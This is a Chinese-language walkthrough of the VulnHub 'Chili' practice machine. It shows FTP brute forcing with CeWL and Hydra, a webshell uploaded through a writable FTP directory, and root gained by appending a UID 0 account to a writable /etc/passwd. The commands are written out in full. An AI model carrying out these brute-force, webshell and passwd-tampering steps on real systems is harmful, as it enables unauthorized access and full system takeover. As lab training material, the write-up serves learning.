# VulnHub - Chili 靶机实战

## 1. 靶机信息

| 项目     | 信息                                 |
| -------- | ------------------------------------ |
| 靶机名称 | Chili                                |
| 靶机 IP  | `192.168.31.134`                     |
| 攻击机   | Kali Linux                           |
| 攻击方向 | FTP 爆破 → WebShell → Linux 本地提权 |
| 最终结果 | 获取 root 权限                       |

## 2. 信息收集

### 2.1 端口扫描

```
nmap -sV -sC 192.168.31.134
```

发现开放端口：

| 端口   | 状态 | 服务 |
| ------ | ---- | ---- |
| 21/tcp | open | FTP  |
| 80/tcp | open | HTTP |

初步判断：

- 21：FTP 文件传输服务，可以尝试收集用户名及密码。

- 80：Web 服务，可以进行网站信息收集和目录探测。

- <img src=".\images\01.png" alt="01" style="zoom:33%;" />

  <img src=".\images\02.png" alt="01" style="zoom:33%;" />

## 3. 用户名收集与 FTP 爆破

### 3.1 CeWL 爬取网站生成用户名典籍

使用 CeWL 爬取目标网站内容，生成可能的用户名字典：

```
cewl http://192.168.31.134 -w username.txt
```

参数说明：

- `cewl`：网页内容爬取工具。
- `-w`：指定字典输出文件。
- `username.txt`：生成的用户名字典。

### 3.2 Hydra 爆破 FTP

使用 Hydra 对 FTP 服务进行账号密码组合尝试：

```
hydra -L username.txt -P passwords.txt ftp://192.168.31.134
```

参数说明：

| 参数             | 含义          |
| ---------------- | ------------- |
| `-L`             | 用户名字典    |
| `-P`             | 密码字典      |
| `ftp://`         | 指定 FTP 服务 |
| `192.168.31.134` | 目标 IP       |

最终获得 FTP 凭据：

```
用户名：chili
密码：a1b2c3d4
```

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

## 4. FTP 登录与 WebShell 获取

### 4.1 登录 FTP

```
ftp 192.168.31.134
```

输入账号密码：

```
Username: chili
Password: a1b2c3d4
```

成功登录 FTP。

### 4.2 发现可写目录

登录后检查 FTP 目录结构及文件权限，发现存在可写目录。

利用 FTP 上传功能，将 WebShell 上传至可写目录。

常用 FTP 命令：

```
ls
pwd
cd 目录名
put shell.php
get 文件名
```

### 4.3 获取 Shell

上传 WebShell 后，通过浏览器访问对应 PHP 文件，执行命令，最终获得目标机器的 Shell。

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

## 5. Linux 本地提权

### 5.1 发现 /etc/passwd 文件可写

获取初始 Shell 后，进行 Linux 本地权限信息收集。

检查：

```
ls -l /etc/passwd
```

发现当前权限可以修改 `/etc/passwd` 文件。

正常情况下：

- `/etc/passwd` 保存用户基本信息。
- 第二个字段通常为 `x`，表示密码哈希保存在 `/etc/shadow`。
- UID 为 0 的用户拥有 root 权限。

### 5.2 使用 Perl 生成密码哈希

执行：

```
perl -le 'print crypt("123456","ad")'
```

生成结果：

```
adrla7IBSfTZQ
```

其中：

- `123456`：明文密码。
- `ad`：盐值。
- `crypt()`：生成密码哈希。

### 5.3 修改 /etc/passwd 创建 UID=0 用户

执行：

```
echo "test1:adrla7IBSfTZQ:0:0:Root:/root:/bin/bash" >> /etc/passwd
```

字段解释：

| 字段 | 内容          | 含义       |
| ---- | ------------- | ---------- |
| 1    | test1         | 用户名     |
| 2    | adrla7IBSfTZQ | 密码哈希   |
| 3    | 0             | UID        |
| 4    | 0             | GID        |
| 5    | Root          | 用户描述   |
| 6    | /root         | 家目录     |
| 7    | /bin/bash     | 登录 Shell |

重点：

**UID=0 代表 root 权限。**

因此创建的 `test1` 用户虽然名字不是 root，但拥有与 root 相同的 UID。

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

### 5.4 切换用户完成提权

执行：

```
su test1
```

输入密码：

```
123456
```

成功切换到 test1 用户。

验证：

```
whoami
id
```

其中 `id` 应显示：

```
uid=0(test1) gid=0(root)
```

至此，提权成功。

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

## 6. 最终结果

| 阶段       | 结果                         |
| ---------- | ---------------------------- |
| 目标 IP    | 192.168.31.134               |
| 开放端口   | 21、80                       |
| 初始入口   | FTP                          |
| FTP 用户名 | chili                        |
| FTP 密码   | a1b2c3d4                     |
| WebShell   | 上传至可写目录               |
| 提权文件   | `/etc/passwd`                |
| 提权方式   | 修改 passwd，创建 UID=0 用户 |
| 新建用户   | test1                        |
| 新用户密码 | 123456                       |
| 最终权限   | root（UID=0）                |

## 7. 实战总结

本次 Chili 靶机主要涉及以下知识点：

1. **CeWL 信息收集**：通过爬取目标网站内容生成用户名字典。
2. **Hydra FTP 爆破**：使用用户名和密码字典获取 FTP 登录凭据。
3. **FTP 文件上传**：发现可写目录，上传 WebShell 获取初始 Shell。
4. **Linux 权限配置错误**：发现 `/etc/passwd` 文件存在可写权限。
5. **Perl crypt()**：生成 Linux 密码哈希。
6. **UID=0 提权**：通过向 `/etc/passwd` 添加用户记录，创建具有 root 身份标识的账户。

### 本次重点收获

- CeWL 可以从目标网站内容中提取单词，辅助构建用户名或密码字典。
- Hydra 的 `-L` 和 `-P` 分别指定用户名和密码字典。
- FTP 不仅可以用于文件下载，也可能因为目录权限配置不当成为 WebShell 上传入口。
- `/etc/passwd` 可写是非常严重的权限配置问题。
- Linux 判断超级用户身份的关键是 UID=0，而不只是用户名是否为 root。
- Perl 的 `crypt()` 可以生成兼容传统 Linux crypt 密码格式的哈希。

## 8. 工具与命令

| 工具 / 命令  | 用途             |
| ------------ | ---------------- |
| Nmap         | 端口扫描         |
| CeWL         | 爬取网站生成字典 |
| Hydra        | FTP 账号密码审计 |
| FTP          | 文件上传与下载   |
| WebShell     | 获取命令执行入口 |
| Perl crypt() | 生成密码哈希     |
| `ls -l`      | 检查文件权限     |
| `su`         | 切换用户         |
| `id`         | 验证 UID、GID    |

## 9. 个人复盘

本次靶机的突破链：

```
Nmap 端口扫描
       ↓
发现 FTP 和 HTTP
       ↓
CeWL 爬取网站生成用户名字典
       ↓
Hydra 爆破 FTP
       ↓
获得 chili:a1b2c3d4
       ↓
FTP 登录
       ↓
发现可写目录
       ↓
上传 WebShell
       ↓
获得初始 Shell
       ↓
发现 /etc/passwd 可写
       ↓
Perl crypt() 生成密码哈希
       ↓
创建 UID=0 的 test1 用户
       ↓
su test1
       ↓
获得 root 权限
```

### 后续需要加强的知识

- CeWL 字典生成规则及参数。
- Hydra 不同服务的爆破语法。
- FTP 上传目录与 Web 目录之间的关系。
- Linux 用户认证机制。
- `/etc/passwd` 与 `/etc/shadow` 的区别。
- UID、GID 与 Linux 权限判断机制。